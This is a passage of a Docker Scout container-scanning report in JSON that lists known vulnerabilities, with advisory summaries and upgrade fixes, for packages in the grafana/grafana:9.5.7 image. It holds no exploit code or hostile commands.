{
  "version": "15.0.6",
  "vulnerabilities": [
    {
      "id": "d9e4b4e0df29d2ae6a99de2ac256df39c2dfd9f3898d86922460bab953ceab7e",
      "category": "container_scanning",
      "message": "CVE-2025-47912 on stdlib@1.20.6",
      "description": "The Parse function permits values other than IPv6 addresses to be included in square brackets within the host component of a URL. RFC 3986 permits IPv6 addresses to be included within the host component, enclosed within square brackets. For example: \"http://[::1]/\". IPv4 addresses and hostnames must not appear within square brackets. Parse did not enforce this requirement.",
      "cve": "CVE-2025-47912",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-47912",
          "value": "CVE-2025-47912",
          "url": "https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-47912?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "f6106179de781e93d279720fa64c61bab9ad098131aa13fcd924ffcb99528e5e",
      "category": "container_scanning",
      "message": "CVE-2025-58183 on stdlib@1.20.6",
      "description": "tar.Reader does not set a maximum size on the number of sparse region data blocks in GNU tar pax 1.0 sparse files. A maliciously-crafted archive containing a large number of sparse regions can cause a Reader to read an unbounded amount of data from the archive into memory. When reading from a compressed source, a small compressed input can result in large allocations.",
      "cve": "CVE-2025-58183",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58183",
          "value": "CVE-2025-58183",
          "url": "https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58183?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "79e9ddafea0d26ed3c011a5c439158b54a0a7a7f1b2ab6803a017b86c654b2b8",
      "category": "container_scanning",
      "message": "CVE-2025-58185 on stdlib@1.20.6",
      "description": "Parsing a maliciously crafted DER payload could allocate large amounts of memory, causing memory exhaustion.",
      "cve": "CVE-2025-58185",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58185",
          "value": "CVE-2025-58185",
          "url": "https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58185?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "c210b6d696dd1aad4e2ee4d3e0fd9c4500a40f86239ad2fc5f06ac115ebc5945",
      "category": "container_scanning",
      "message": "CVE-2025-58186 on stdlib@1.20.6",
      "description": "Despite HTTP headers having a default limit of 1MB, the number of cookies that can be parsed does not have a limit. By sending a lot of very small cookies such as \"a=;\", an attacker can make an HTTP server allocate a large amount of structs, causing large memory consumption.",
      "cve": "CVE-2025-58186",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58186",
          "value": "CVE-2025-58186",
          "url": "https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58186?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "55c4fbc44120482e93c234fc09a86acc79a2858910739ee76ef732a9d851f048",
      "category": "container_scanning",
      "message": "CVE-2025-58187 on stdlib@1.20.6",
      "description": "Due to the design of the name constraint checking algorithm, the processing time of some inputs scals non-linearly with respect to the size of the certificate.\n\nThis affects programs which validate arbitrary certificate chains.",
      "cve": "CVE-2025-58187",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.9",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58187",
          "value": "CVE-2025-58187",
          "url": "https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58187?s=golang&n=stdlib&t=golang&vr=%3C1.24.9"
        }
      ]
    },
    {
      "id": "8d1a593e75732ebdc6fc6270c152940cb693b82ff336d1489060174927a018ff",
      "category": "container_scanning",
      "message": "CVE-2025-58188 on stdlib@1.20.6",
      "description": "Validating certificate chains which contain DSA public keys can cause programs to panic, due to a interface cast that assumes they implement the Equal method.\n\nThis affects programs which validate arbitrary certificate chains.",
      "cve": "CVE-2025-58188",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58188",
          "value": "CVE-2025-58188",
          "url": "https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58188?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "02defef0fee948a2a3f2b9e74e539e2de42eb399f46496aa9089cfc3f1de1e67",
      "category": "container_scanning",
      "message": "CVE-2025-58189 on stdlib@1.20.6",
      "description": "When Conn.Handshake fails during ALPN negotiation the error contains attacker controlled information (the ALPN protocols sent by the client) which is not escaped.",
      "cve": "CVE-2025-58189",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-58189",
          "value": "CVE-2025-58189",
          "url": "https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-58189?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "89c6dffc91e4c2a338c2965dc2f423d7e81c1a7614e7637b9acd1a84f911bdc6",
      "category": "container_scanning",
      "message": "CVE-2025-61723 on stdlib@1.20.6",
      "description": "The processing time for parsing some invalid inputs scales non-linearly with respect to the size of the input.\n\nThis affects programs which parse untrusted PEM inputs.",
      "cve": "CVE-2025-61723",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-61723",
          "value": "CVE-2025-61723",
          "url": "https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-61723?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "50fd9558c3a31355681004815046abb593d257d3e551413fd12d07d0fabe2f93",
      "category": "container_scanning",
      "message": "CVE-2025-61724 on stdlib@1.20.6",
      "description": "The Reader.ReadResponse function constructs a response string through repeated string concatenation of lines. When the number of lines in a response is large, this can cause excessive CPU consumption.",
      "cve": "CVE-2025-61724",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-61724",
          "value": "CVE-2025-61724",
          "url": "https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-61724?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "f4838eae5678ae2cca4c6fa298fa371a52ec1ed653209d1b2e31e85fa79a5a09",
      "category": "container_scanning",
      "message": "CVE-2025-61725 on stdlib@1.20.6",
      "description": "The ParseAddress function constructeds domain-literal address components through repeated string concatenation. When parsing large domain-literal components, this can cause excessive CPU consumption.",
      "cve": "CVE-2025-61725",
      "severity": "Unknown",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.24.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-61725",
          "value": "CVE-2025-61725",
          "url": "https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-61725?s=golang&n=stdlib&t=golang&vr=%3C1.24.8"
        }
      ]
    },
    {
      "id": "be60320f93cfe53a166cedac4bd3800dceba1a7bd0bfdd84e9b650c9a7b59d2b",
      "category": "container_scanning",
      "message": "CVE-2024-10452 on github.com/grafana/grafana@9.5.7",
      "description": "Organization admins can delete pending invites created in an organization they are not part of.",
      "cve": "CVE-2024-10452",
      "severity": "Low",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-10452",
          "value": "CVE-2024-10452",
          "url": "https://scout.docker.com/v/CVE-2024-10452?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D10.4.0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-10452?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3C%3D10.4.0"
        }
      ]
    },
    {
      "id": "0a4d8da037eed6ec1833ce72d7d5039c9ad3529ca1ecb3889c1150860afeea7a",
      "category": "container_scanning",
      "message": "CVE-2024-51744 on github.com/golang-jwt/jwt@4.4.3",
      "description": "### Summary\n\nUnclear documentation of the error behavior in `ParseWithClaims` can lead to situation where users are potentially not checking errors in the way they should be. Especially, if a token is both expired and invalid, the errors returned by `ParseWithClaims` return both error codes. If users only check for the `jwt.ErrTokenExpired ` using `error.Is`, they will ignore the embedded `jwt.ErrTokenSignatureInvalid` and thus potentially accept invalid tokens.\n\n### Fix\n\nWe have back-ported the error handling logic from the `v5` branch to the `v4` branch. In this logic, the `ParseWithClaims` function will immediately return in \"dangerous\" situations (e.g., an invalid signature), limiting the combined errors only to situations where the signature is valid, but further validation failed (e.g., if the signature is valid, but is expired AND has the wrong audience). This fix is part of the 4.5.1 release.\n\n### Workaround \n\nWe are aware that this changes the behaviour of an established function and is not 100 % backwards compatible, so updating to 4.5.1 might break your code. In case you cannot update to 4.5.0, please make sure that you are properly checking for all errors (\"dangerous\" ones first), so that you are not running in the case detailed above.\n\n```Go\ntoken, err := /* jwt.Parse or similar */\nif token.Valid {\n\tfmt.Println(\"You look nice today\")\n} else if errors.Is(err, jwt.ErrTokenMalformed) {\n\tfmt.Println(\"That's not even a token\")\n} else if errors.Is(err, jwt.ErrTokenUnverifiable) {\n\tfmt.Println(\"We could not verify this token\")\n} else if errors.Is(err, jwt.ErrTokenSignatureInvalid) {\n\tfmt.Println(\"This token has an invalid signature\")\n} else if errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet) {\n\t// Token is either expired or not active yet\n\tfmt.Println(\"Timing is everything\")\n} else {\n\tfmt.Println(\"Couldn't handle this token:\", err)\n}\n```",
      "cve": "CVE-2024-51744",
      "severity": "Low",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/golang-jwt/jwt@4.4.3 to 4.5.1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/golang-jwt/jwt@4.4.3#v4"
          },
          "version": "4.4.3"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-51744",
          "value": "CVE-2024-51744",
          "url": "https://scout.docker.com/v/CVE-2024-51744?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-51744?s=github&n=v4&ns=github.com%2Fgolang-jwt%2Fjwt&t=golang&vr=%3C4.5.1"
        }
      ]
    },
    {
      "id": "18b57c8b53fd6468a480212cbc3ae5a8033d2ce225edd7d4592be36e0f2c366f",
      "category": "container_scanning",
      "message": "CVE-2020-8912 on github.com/aws/aws-sdk-go@1.44.234",
      "description": "A vulnerability in the in-band key negotiation exists in the AWS S3 Crypto SDK for GoLang versions prior to V2. An attacker with write access to the targeted bucket can change the encryption algorithm of an object in the bucket, which can then allow them to change AES-GCM to AES-CTR. Using this in combination with a decryption oracle can reveal the authentication key used by AES-GCM as decrypting the GMAC tag leaves the authentication key recoverable as an algebraic equation. It is recommended to update your SDK to V2 or later, and re-encrypt your files.",
      "cve": "CVE-2020-8912",
      "severity": "Low",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/aws/aws-sdk-go@1.44.234"
          },
          "version": "1.44.234"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2020-8912",
          "value": "CVE-2020-8912",
          "url": "https://scout.docker.com/v/CVE-2020-8912?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2020-8912?s=golang&n=aws-sdk-go&ns=github.com%2Faws&t=golang&vr=%3E%3D0"
        }
      ]
    },
    {
      "id": "bcf547d967bdfe8c12fa4d30b23b8f94f29848c1bed6473b097f8d5ac4f23fb8",
      "category": "container_scanning",
      "message": "CVE-2025-1088 on github.com/grafana/grafana@9.5.7",
      "description": "In Grafana, an excessively long dashboard title or panel name will cause Chromium browsers to become unresponsive due to Improper Input Validation vulnerability in Grafana.\nThis issue affects Grafana: before 11.6.2 and is fixed in 11.6.2 and higher.",
      "cve": "CVE-2025-1088",
      "severity": "Low",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/grafana/grafana@9.5.7 to 11.6.2",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-1088",
          "value": "CVE-2025-1088",
          "url": "https://scout.docker.com/v/CVE-2025-1088?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D0.0.1-test%2C%3C11.6.2"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-1088?s=github&n=grafana&ns=github.com%2Fgrafana&t=golang&vr=%3E%3D0.0.1-test%2C%3C11.6.2"
        }
      ]
    },
    {
      "id": "c9ee406e4c5f5a617785491835f753a81f8880ad297b728e5ef726f46aa70b51",
      "category": "container_scanning",
      "message": "CVE-2024-2004 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2024-2004",
      "severity": "Low",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.7.1-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-2004",
          "value": "CVE-2024-2004",
          "url": "https://scout.docker.com/v/CVE-2024-2004?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-2004?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.7.1-r0"
        }
      ]
    },
    {
      "id": "ab9fd4837569315452d0a0332a3674b1b485ef34df10a5f2d9f94ae297ea7f19",
      "category": "container_scanning",
      "message": "CVE-2023-38546 on alpine/curl@8.2.0-r1",
      "cve": "CVE-2023-38546",
      "severity": "Low",
      "confidence": "Unknown",
      "solution": "Upgrade alpine/curl@8.2.0-r1 to 8.4.0-r0",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/curl@8.2.0-r1?os_name=alpine&os_version=3.17"
          },
          "version": "8.2.0-r1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-38546",
          "value": "CVE-2023-38546",
          "url": "https://scout.docker.com/v/CVE-2023-38546?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.4.0-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-38546?s=alpine&n=curl&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C8.4.0-r0"
        }
      ]
    },
    {
      "id": "dd44cac530f22996c51434d13f421126f2624b4db0348163dcbfc551f3774e63",
      "category": "container_scanning",
      "message": "GHSA-2c7c-3mj9-8fqh on github.com/go-jose/go-jose@3.0.0",
      "description": "The go-jose package is subject to a \"billion hashes attack\" causing denial-of-service when decrypting JWE inputs. This occurs when an attacker can provide a PBES2 encrypted JWE blob with a very large p2c value that, when decrypted, produces a denial-of-service.",
      "cve": "GHSA-2c7c-3mj9-8fqh",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/go-jose/go-jose@3.0.0 to 3.0.1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/go-jose/go-jose@3.0.0#v3"
          },
          "version": "3.0.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "GHSA-2c7c-3mj9-8fqh",
          "value": "GHSA-2c7c-3mj9-8fqh",
          "url": "https://scout.docker.com/v/GHSA-2c7c-3mj9-8fqh?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/GHSA-2c7c-3mj9-8fqh?s=github&n=v3&ns=github.com%2Fgo-jose%2Fgo-jose&t=golang&vr=%3C3.0.1"
        }
      ]
    },
    {
      "id": "0fa3ac9d4c95417c56590697974f47127114d416a4bc0bf5a738754d140c9230",
      "category": "container_scanning",
      "message": "GHSA-32gq-x56h-299c on filippo.io/age@1.1.1",
      "description": "A plugin name containing a path separator may allow an attacker to execute an arbitrary binary.\n\nSuch a plugin name can be provided to the age CLI through an attacker-controlled recipient or identity string, or to the [`plugin.NewIdentity`](https://pkg.go.dev/filippo.io/age/plugin#NewIdentity), [`plugin.NewIdentityWithoutData`](https://pkg.go.dev/filippo.io/age/plugin#NewIdentityWithoutData), or [`plugin.NewRecipient`](https://pkg.go.dev/filippo.io/age/plugin#NewRecipient) APIs.\n\nOn UNIX systems, a directory matching `${TMPDIR:-/tmp}/age-plugin-*` needs to exist for the attack to succeed.\n\nThe binary is executed with a single flag, either `--age-plugin=recipient-v1` or `--age-plugin=identity-v1`. The standard input includes the recipient or identity string, and the random file key (if encrypting) or the header of the file (if decrypting). The format is constrained by the [age-plugin](https://c2sp.org/age-plugin) protocol.\n\nAn equivalent issue was fixed by the [rage](https://github.com/str4d/rage) project, see advisory [GHSA-4fg7-vxc8-qx5w](https://github.com/str4d/rage/security/advisories/GHSA-4fg7-vxc8-qx5w).\n\nThanks to ⬡-49016 for reporting this.",
      "cve": "GHSA-32gq-x56h-299c",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade filippo.io/age@1.1.1 to 1.2.1",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/filippo.io/age@1.1.1"
          },
          "version": "1.1.1"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "GHSA-32gq-x56h-299c",
          "value": "GHSA-32gq-x56h-299c",
          "url": "https://scout.docker.com/v/GHSA-32gq-x56h-299c?s=github&n=age&ns=filippo.io&t=golang&vr=%3C1.2.1"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/GHSA-32gq-x56h-299c?s=github&n=age&ns=filippo.io&t=golang&vr=%3C1.2.1"
        }
      ]
    },
    {
      "id": "321999171cb42388565492e411331fd406f9a9dc8a46f9955dca004f713e33d2",
      "category": "container_scanning",
      "message": "CVE-2023-6992 on alpine/zlib@1.2.13-r0",
      "cve": "CVE-2023-6992",
      "severity": "Medium",
      "confidence": "Unknown",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:apk/alpine/zlib@1.2.13-r0?os_name=alpine&os_version=3.17"
          },
          "version": "1.2.13-r0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-6992",
          "value": "CVE-2023-6992",
          "url": "https://scout.docker.com/v/CVE-2023-6992?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.2.13-r0"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-6992?s=alpine&n=zlib&ns=alpine&t=apk&osn=alpine&osv=3.17&vr=%3C%3D1.2.13-r0"
        }
      ]
    },
    {
      "id": "efb17aeb8b5b1287dcc8151d475afc7d2b0825ec8984ffb24f2b96c046485070",
      "category": "container_scanning",
      "message": "CVE-2025-22866 on stdlib@1.20.6",
      "description": "Due to the usage of a variable time instruction in the assembly implementation of an internal function, a small number of bits of secret scalars are leaked on the ppc64le architecture. Due to the way this function is used, we do not believe this leakage is enough to allow recovery of the private key when P-256 is used in any well known protocols.",
      "cve": "CVE-2025-22866",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.22.12",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2025-22866",
          "value": "CVE-2025-22866",
          "url": "https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2025-22866?s=golang&n=stdlib&t=golang&vr=%3C1.22.12"
        }
      ]
    },
    {
      "id": "59a72b8cc32d8aacf045ea9a79244b0a2829f29160552ed6f96463687d739694",
      "category": "container_scanning",
      "message": "CVE-2024-45339 on github.com/golang/glog@1.0.0",
      "description": "When logs are written to a widely-writable directory (the default), an unprivileged attacker may predict a privileged process's log file path and pre-create a symbolic link to a sensitive file in its place. When that privileged process runs, it will follow the planted symlink and overwrite that sensitive file. To fix that, glog now causes the program to exit (with status code 2) when it finds that the configured log file already exists.",
      "cve": "CVE-2024-45339",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/golang/glog@1.0.0 to 1.2.4",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/golang/glog@1.0.0"
          },
          "version": "1.0.0"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2024-45339",
          "value": "CVE-2024-45339",
          "url": "https://scout.docker.com/v/CVE-2024-45339?s=github&n=glog&ns=github.com%2Fgolang&t=golang&vr=%3C1.2.4"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2024-45339?s=github&n=glog&ns=github.com%2Fgolang&t=golang&vr=%3C1.2.4"
        }
      ]
    },
    {
      "id": "0df92eb2ca2bf250a1dc80e75746263f6715e9b93c41e24e0a8a38daf87dbc7d",
      "category": "container_scanning",
      "message": "CVE-2023-45289 on stdlib@1.20.6",
      "description": "When following an HTTP redirect to a domain which is not a subdomain match or exact match of the initial domain, an http.Client does not forward sensitive headers such as \"Authorization\" or \"Cookie\". For example, a redirect from foo.com to www.foo.com will forward the Authorization header, but a redirect to bar.com will not.\n\nA maliciously crafted HTTP redirect could cause sensitive headers to be unexpectedly forwarded.",
      "cve": "CVE-2023-45289",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade stdlib@1.20.6 to 1.21.8",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/stdlib@1.20.6"
          },
          "version": "1.20.6"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
          "name": "CVE-2023-45289",
          "value": "CVE-2023-45289",
          "url": "https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ],
      "links": [
        {
          "url": "https://scout.docker.com/v/CVE-2023-45289?s=golang&n=stdlib&t=golang&vr=%3C1.21.8"
        }
      ]
    },
    {
      "id": "b4b8527fd8c24602c4e1770055e818aa3140a65e5f868a7601796684dbedeea1",
      "category": "container_scanning",
      "message": "CVE-2024-11741 on github.com/grafana/grafana@9.5.7",
      "description": "Grafana is an open-source platform for monitoring and observability. \nThe Grafana Alerting VictorOps integration was not properly protected and could be exposed to users with Viewer permission. \nFixed in versions 11.5.0, 11.4.1, 11.3.3, 11.2.6, 11.1.11, 11.0.11 and 10.4.15",
      "cve": "CVE-2024-11741",
      "severity": "Medium",
      "confidence": "Unknown",
      "solution": "Upgrade github.com/grafana/grafana@9.5.7 to 10.4.15",
      "scanner": {
        "id": "docker-scout",
        "name": "Docker Scout"
      },
      "location": {
        "dependency": {
          "package": {
            "name": "pkg:golang/github.com/grafana/grafana@9.5.7"
          },
          "version": "9.5.7"
        },
        "operating_system": "alpine 3.17",
        "image": "grafana/grafana:9.5.7"
      },
      "identifiers": [
        {
          "type": "cve",
